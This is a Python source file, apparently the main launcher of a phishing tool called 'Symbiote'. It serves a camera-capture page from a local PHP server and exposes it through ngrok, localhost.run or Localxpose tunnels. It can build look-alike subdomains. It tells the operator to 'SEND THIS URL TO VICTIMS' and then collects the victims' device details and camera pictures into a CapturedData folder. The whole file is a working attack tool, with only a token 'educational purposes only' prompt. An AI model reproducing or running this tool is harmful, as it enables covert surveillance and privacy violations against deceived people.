#!/usr/bin/python3
# This Python file uses the following encoding: utf-8
import getpass
import base64
import multiprocessing
import gettext
import sys
import ssl
import re
import json
import subprocess
import ctypes
from time import sleep
from os import system, environ, path, getuid, popen
from distutils.dir_util import copy_tree
from subprocess import check_output, CalledProcessError
from sys import stdout, argv, exit
from Server import *
from Checks import *
from logo import *
from pross_kill import *
#hiiii
RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW, YELLOW2, GREEN2= '\033[1;91m', '\033[46m', '\033[1;36m', '\033[1;32m', '\033[0m' , '\033[1;33m' , '\033[1;93m', '\033[1;92m'
blink='\033[5m'
def menu_q():
    system('clear')                                                                        
    print('            {5}                                                 \n               |  {2}"{3}UNIX IS VERY SIMPLE {2}IT JUST NEEDS A{5}  |{4}'.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    print('               {5}|  {2}GENIUS TO UNDERSTAND ITS SIMPLICITY"{5}  |{4}'.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    print("               {5}|                       {0}~{3}Dennis Ritchie{5}  |\n{4}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    if input("\n\nDo you agree to use this tool for educational purposes only? {5}({3}Y{5}/{0}N{5})\n{0}<Symbiote> {5}---->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW)).upper() == 'Y':
        sleep(0.5)
    else:
        print("\n\n{0}YOU ARE NOT AUTHORIZED TO USE THIS TOOL.YOU CAN ONLY USE IT FOR EDUCATIONAL PURPOSE.! ]{4}\n\n".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        exit()
def div_q(): #not in using 
    global user
    system('clear')
    if input("\n\n{0}[{2}#{0}]{2} IF YOUR USING THIS TOOL IN ANDROID PRESS 'Y' {5}({3}Y{5}/{0}N{5})\n{0}<Symbiote> {5}---->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW)).upper() == 'Y':
          android_banner()
          user = '1'
          sleep(7)
          #checkjp2a()
          checkPHP()
          checkNgrok()
          checkLocalxpose()
    else:
        banner()
        sleep(7)
        #checkjp2a()
        checkPHP()
        checkNgrok()
        checkLocalxpose()

def option():
    system('clear')
    sbanner()
    print("\n{5}----------------------------------\n{0}[{2} FRONT CAMERA  OR BACK CAMERA {5}??{0}] \n{5}----------------------------------{4}\n".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    print("{0}[{2}1{0}]{2} FRONT CAMERA \n{0}[{2}2{0}]{2} BACK CAMERA{4}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    choice = input("\n{0}<Symbiote> {5}---->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    global name
    if choice == '1':
        name = 'www_f'
        print("\t{0}[{2}#{0}]{2} YOU SELECTED FRONT CAMERA {0}!!{4}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        sleep(2)
    elif choice == '2':
        name = 'www_b'
        print("\t{0}[{2}#{0}]{2} YOU SELECTED BACK CAMERA {0}!!{4}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        sleep(2)
    else:
        option()


def selectPort():
    system('clear')
    sbanner()
    print("\n\n{5}--------------------------------------\n{0}[{2} Select Any Available Port [1-65535]:{0}] \n{5}--------------------------------------{4}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    choice = input(" {0}<Symbiote> {5}---->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW,blink))
    try:
        if (int(choice) > 65535 or int(choice) < 1):
            return selectPort()
        else:
            return choice
    except:
        return selectPort()

def runNgrok(port):
    sbanner()
    print("\n\n{5}-------------------------------\n{0}[{2} CREATE A CUSTOM URL HERE !!{0}] \n{5}-------------------------------".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    print("\n\t {0}wait for few second.....".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    system("fuser -k %s/tcp > /dev/null 2>&1"%(port))
    system("cd Server/{0}/ && php -S 127.0.0.1:{1} > /dev/null 2>&1 &".format(name,port))
    sleep(2)
    system('./Server/ngrok http {0} > /dev/null &'.format(port))
    sleep(10)
    while True:
        system('curl -s -N http://127.0.0.1:4040/api/tunnels | jq | grep public_url | grep -Eo "(http)://[a-zA-Z0-9./?=_%:-]*" > link.url')
        urlFile = open('link.url','r')
        url = urlFile.read()
        urlFile.close()
        #printoutput('ngrok',url,port)
        ngrokoutput('ngrok',url,port)
        sleep(7)

def customLocalxpose(port):
    sbanner()
    print("\n\n{5}-------------------------------\n{0}[{2} CREATE A CUSTOM URL HERE !!{0}] \n{5}-------------------------------\n\n{0}[{2}!{0}] {2}YOU CAN MAKE YOUR URL SIMILAR TO AUTHENTIC URL.\n\n{0}[{2}*{0}]{2}Insert a custom subdomain for Localxpose{5}({0}Ex: {2}mysubdomain{5}){4}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    print("\n\t {0}wait for few second.....".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    lnk = input("\n{0}CUSTOM Subdomain---> {2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    system("fuser -k %s/tcp > /dev/null 2>&1" % (port))
    system("cd Server/{0}/ && php -S 127.0.0.1:{1} > /dev/null 2>&1 &".format(name,port))
    system('./Server/loclx tunnel --raw-mode http --to :%s --subdomain %s > link.url 2>&1 &' % (port, lnk))
    sleep(10)
    try:
        output = check_output("grep -o '.\{0,0\}https.\{0,100\}' link.url", shell=True)
        url = output.decode("utf-8")
        #printoutput('c_loclx',url,port)
        c_loclxoutput('c_loclx',url,port)
        system('clear')
        #print("\n\n-------------------------------\n[ CUSTOM SERVEO URL ]{1}!! \n-------------------------------")
        #print("\n{0}[{2}!{0}]{2} SEND THIS LOCALXPOSE URL TO VICTIMS-\n{0}[{2}*{0}]{2} Localhost URL: http://127.0.0.1:{6}\n{0}[{2}*{0}] {2}LOCALXPOSE URL: ".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW, port) + url )
        #print("\n")

    except CalledProcessError:
        print("\n\n{0}FAILED TO GET THIS DOMAIN. !!!\n\nLOOKS LIKE CUSTOM URL IS NOT VALID or ALREADY OCCUPIED BY SOMEONE ELSE. !!!\n\n {0}[{2}!{0}]{0}TRY TO SELECT ANOTHER CUSTOM DOMAIN (GOING BACK).. !! \n".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        sleep(4)
        system('clear')
        return customLocalxpose(port)


def randomLocalxpose(port):
    system('clear')
    sbanner()
    print("\n\n{5}-------------------------------\n{0} [ {2}RANDOM LOCALXPOSE URL !!{0}] \n{5}-------------------------------{4}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    print("\n\t {0}wait for few second.....".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    # system("fuser -k %s/tcp > /dev/null 2>&1" % (port))
    system("cd Server/{0}/ && php -S 127.0.0.1:{1} > /dev/null 2>&1 &".format(name,port))
    system('./Server/loclx tunnel --raw-mode http --to :%s > link.url 2>&1 &' % (port))
    sleep(10)
    f=open("link.url", "r")
    url=(f"{f.read().split(',')[1]}")
    f.close()
    r_loclxoutput('r_loclx',url,port)


def randomServeo(port):
    system('clear')
    sbanner()
    print("\n\n{5}-------------------------------\n{0}[{2} RANDOM localhost URL !!{0}] \n{5}-------------------------------".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW))
    print("\n\t {0}wait for few second.....".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    system("fuser -k %s/tcp > /dev/null 2>&1" % (port))
    system("cd Server/{0}/ && php -S 127.0.0.1:{1} > /dev/null 2>&1 &".format(name,port))
    system('ssh -R 80:localhost:%s ssh.localhost.run > link.url 2> /dev/null &' % (port))
    sleep(10)
    f=open("link.url", "r")
    url=(f"{f.read().split(',')[1]}")
    f.close()
    serveo('localhost',url,port)


def selectServer(port):
    global king
    global kill
    system('clear')
    sbanner()
    print("\n\n{5}----------------------------------\n{0}[{2} Select Any Available Server:{0}] \n{5}----------------------------------".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW))
    print("\n{0}[{2}*{0}]{2}Select Any Available Server:".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    print("\n {0}[{2}1{0}]{2}Ngrok\n {0}[{2}2{0}]{2}localhost.run {5}\n {0}[{2}3{0}]{2}Localxpose".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    choice = input("\n{0}<Symbiote> {5}---->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    if choice == '1':
        system('clear')
        #global king 
        king=1
        runNgrok(port)
    elif choice == '2':
        system('clear')
        #global king
        king=2
        randomServeo(port)
    elif choice == '3':
        #system('chmod 777 ./Server/loclx')
        system('clear')
        sbanner()
        print("\n\n{5}----------------------------------\n{0}[{2} LOCALXPOSE URL TYPE SELECTION !!{0}] \n{5}----------------------------------{4}\n".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        print("\n{0}[{2}*{0}]{2}CHOOSE ANY LOCALXPOSE URL TYPE TO GENERATE PHISHING LINK:".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        print("\n{0}[{2}1{0}]{2}Custom URL {5}({2}Generates designed url{5}) \n{0}[{2}2{0}]{2}Random URL {5}({2}Generates Random url{5}){4}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        #global ichoice
        ichoice = input("\n\n{0}<Symbiote> {5}---->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW,blink))
        system('clear')
        if ichoice == '1': 
            #global king
            king=3
            customLocalxpose(port)
        elif ichoice == '2': 
            #global king
            king=4
            randomLocalxpose(port)
        else:
            system('clear')
            return selectServer(port)
    else:
        system('clear')
        return selectServer(port)

def getpath():
    path = popen('pwd').readline()
    x = path.split("\n")
    f = open("Server/www_f/path.txt", "w")
    f.write("{0}/CapturedData/".format(x[0]))
    f.close()
    sleep(2)
    path = popen('pwd').readline()
    x = path.split("\n")
    f = open("Server/www_b/path.txt", "w")
    f.write("{0}/CapturedData/".format(x[0]))
    f.close()
    sleep(2)

def fresh():
    system("fuser -k Server/ngrok > /dev/null 2>&1")
    system('rm -rf Server/www_f/ip.txt && touch Server/www_f/ip.txt')
    system('rm -rf Server/www_b/ip.txt && touch Server/www_b/ip.txt')
    system('rm -rf Server/www_f/Log.log && touch Server/www_f/Log.log')
    system('rm -rf Server/www_b/Log.log && touch Server/www_b/Log.log') 
    system('rm -rf Server/www_f/path.txt && touch Server/www_f/path.txt')
    system('rm -rf Server/www_b/path.txt && touch Server/www_b/path.txt')
    system('fuser -k link.url > /dev/null 2>&1 && rm -rf link.url && touch link.url')


def ngrokoutput(name,url,port):
    system('clear')
    print("\n\n{5}---------------------------\n{0}[{2} NGROK URL !! {0}]{5} \n---------------------------".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    print("\n{0}[{2}*{0}]{2} SEND THIS NGROK URL TO VICTIMS-\n{0}[{2}*{0}]{2} Localhost URL: http://127.0.0.1:{6}\n{0}[{2}*{0}] {2}NGROK URL: ".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW, port) + url )
    report(url,port)
    #elif name == 'c_loclx':
def c_loclxoutput(name,url,port):
    system('clear')
    print("\n\n{5}------------------------------\n{0}[{2} CUSTOM LOCALXPOSEL !! {0}]{5} \n------------------------------".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    print("\n{0}[{2}!{0}]{2} SEND THIS LOCALXPOSE URL TO VICTIMS-\n{0}[{2}*{0}]{2} Localhost URL: http://127.0.0.1:{6}\n{0}[{2}*{0}] {2}LOCALXPOSE URL: ".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW, port) + url )
    report(url,port)
    #elif name == 'r_loclx':
def r_loclxoutput(name,url,port):
    system('clear')
    print("\n\n{5}------------------------------\n{0}[{2} RANDOM LOCALXPOSEL !! {0}]{5} \n------------------------------".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    print("\n{0}[{2}!{0}]{2} SEND THIS LOCALXPOSE URL TO VICTIMS-\n{0}[{2}*{0}]{2} Localhost URL: http://127.0.0.1:{6}\n{0}[{2}*{0}] {2}LOCALXPOSE URL: ".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW, port) + url )
    report(url,port)
    #elif name == 'serveo':
def serveo(name,url,port):
    system('clear')
    print("\n\n{5}----------------------------\n{0}[{2} SERVEO LINK !! {0}]{5} \n----------------------------".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW)) 
    print("\n{0}[{2}!{0}]{2} SEND THIS SERVEO URL TO VICTIMS-\n\n{0}[{2}*{0}]{2} Localhost URL: http://127.0.0.1:{6}\n{0}[{2}*{0}]{2} SERVEO URL: ".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW, port) + url )
    report(url,port)

def report(url,port):
    system('clear')
    sbanner()
    print("{5}\n+++++++++++++++++++++++++++++++++++++++++++++++++++++++++{0}\n\t[{2}IF U WANT TO REFRESH THE DATA TAP ENTER{0}]\n\t{0}[{2}       IF U WANT TO EXIT ENTER {6}X       {0}]\n\t{0}[{2}     IT TAKES TIME TO RECEIVE PIC      {0}]\n{5}++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW,GREEN2))
    print("\n{0}[{2}*{0}]{2} SEND THIS URL TO VICTIMS-\n{0}[{2}*{0}]{2} Localhost URL: http://127.0.0.1:{6}\n{0}[{2}*{0}] {2}HACKING URL: ".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW, port) + url )
    while True:
        #with open('Server/www/ip.txt') as f:
            #if 'IP: ' in f.read():
                #print (f.read())
        with open('Server/{0}/ip.txt'.format(name)) as creds:
            lines = creds.read().rstrip()
            if len(lines) != 0:
                print('\n {0}[{2} DEVICE DETAILS FOUND {0}]{2}:\n {7}{6}{4}'.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW,lines,GREEN2))
                system('touch CapturedData/ip.txt && cat Server/{0}/ip.txt >> CapturedData/ip.txt'.format(name))
                print(" {5}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW,lines,GREEN2))
                system('cat Server/{0}/Log.log'.format(name))
        ans=input("{0}<Symbiote> {5}---->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW,lines,GREEN2)).upper()
        if (ans == "X"):
            system('clear')
            system('cat Server/{0}/ip.txt >> CapturedData/ip.txt'.format(name))
            pid=(int(os.popen("netstat -nlp | grep php").read().split('LISTEN')[1].split('/')[0].strip()))
            os.kill(pid,9)
            fresh()
            global kill
            if kill == '1':
                android_end()
            elif kill == '2':
                 end()
            exit()
        else:
            system('clear')
            sleep(0.2)
            report(url,port)
system('clear')
# verCheck()
system('termux-open https://github.com/404-ghost/symbiote &>/dev/null')
system("git pull --quiet") 
sleep(1)
menu_q()
global kill
system('clear')
sbanner()
if input("\n\n{0}[{2}#{0}]{2} IF YOUR USING THIS TOOL IN ANDROID PRESS 'Y' {5}({3}Y{5}/{0}N{5})\n{0}<Symbiote> {5}---->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW)).upper() == 'Y':
    android_banner()
    kill = '1'
else:
    banner()
    kill = '2'
    sleep(4)
checkjp2a()
checkPHP()
checkNgrok()
checkLocalxpose()
fresh()
getpath()
port=selectPort()
option()
selectServer(port)
